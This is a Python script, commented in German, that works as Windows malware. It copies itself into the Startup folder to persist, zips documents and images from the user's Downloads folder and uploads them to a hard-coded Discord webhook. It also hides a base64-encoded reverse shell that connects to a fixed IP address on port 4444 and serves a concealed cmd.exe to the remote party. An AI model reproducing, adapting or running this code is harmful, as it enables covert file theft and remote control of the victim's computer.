import os
import shutil
import sys
import zipfile
import requests
import base64
import threading
import subprocess

def kopiere_in_autostart():
    if getattr(sys, 'frozen', False):
        # Pfad zur aktuellen ausführbaren Datei im Falle einer .exe
        anwendungspfad = sys.executable
    else:
        # Pfad zum Skript, wenn es als .py ausgeführt wird
        anwendungspfad = __file__
    
    datei_name = os.path.basename(anwendungspfad)
    autostart_pfad = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
    ziel_pfad = os.path.join(autostart_pfad, datei_name)
    try:
        shutil.copy(anwendungspfad, ziel_pfad)
    except Exception:
        pass

def zip_directory(folder_path, zip_name, extensions):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith(extensions):
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(folder_path, '..')))

def send_to_discord(webhook_url, file_path):
    with open(file_path, 'rb') as f:
        requests.post(webhook_url, files={'file': (os.path.basename(file_path), f)})

kopiere_in_autostart()

download_folder = os.path.join(os.environ['USERPROFILE'], 'Downloads')
zip_name = 'downloads.zip'
webhook_url = 'https://discord.com/api/webhooks/1177517676223012864/x-UN4cbLLkUvbJyF6WeigzLoaKh-47m6uESSpAky_sKU6vxWlV3XO4W2-JhAL5BRBiY9'
extensions = ('.pdf', '.jpg', '.txt', '.png')

zip_directory(download_folder, zip_name, extensions)
send_to_discord(webhook_url, zip_name)

encoded_str = 'aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3MsIHRocmVhZGluZwoKZGVmIHMycChzLCBwKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgICAgIGlmIGxlbihkYXRhKSA+IDA6CiAgICAgICAgICAgIHAuc3RkaW4ud3JpdGUoZGF0YSkKICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpCgpkZWYgcDJzKHMsIHApOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkKCiMgS29uZmlndXJpZXJlIHN0YXJ0dXBpbmZvLCB1bSBkYXMgQ01ELUZlbnN0ZXIgenUgdmVyc3RlY2tlbgpzdGFydHVwaW5mbyA9IHN1YnByb2Nlc3MuU1RBUlRVUElORk8oKQpzdGFydHVwaW5mby5kd0ZsYWdzIHw9IHN1YnByb2Nlc3MuU1RBUlRGX1VTRVNIT1dXSU5ET1cKCiMgRXJzdGVsbGUgU29ja2V0LVZlcmJpbmR1bmcKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiNzcuOTEuMTI0LjE3OCIsIDQ0NDQpKQoKIyBTdGFydGUgZGVuIFByb3plc3Mgb2huZSBzaWNodGJhcmVzIEZlbnN0ZXIKcCA9IHN1YnByb2Nlc3MuUG9wZW4oWyJjbWQiXSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VULCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0YXJ0dXBpbmZvPXN0YXJ0dXBpbmZvKQoKIyBTdGFydGUgZGllIFRocmVhZHMgZsO8ciBkaWUgRGF0ZW7DvGJlcnRyYWd1bmcKczJwX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXMycCwgYXJncz1bcywgcF0pCnMycF90aHJlYWQuZGFlbW9uID0gVHJ1ZQpzMnBfdGhyZWFkLnN0YXJ0KCkKCnAyc190aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wMnMsIGFyZ3M9W3MsIHBdKQpwMnNfdGhyZWFkLmRhZW1vbiA9IFRydWUKcDJzX3RocmVhZC5zdGFydCgpCgp0cnk6CiAgICBwLndhaXQoKQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBzLmNsb3NlKCkK'
decoded_bytes = base64.b64decode(encoded_str)
decoded_str = decoded_bytes.decode('utf-8')
exec(decoded_str)
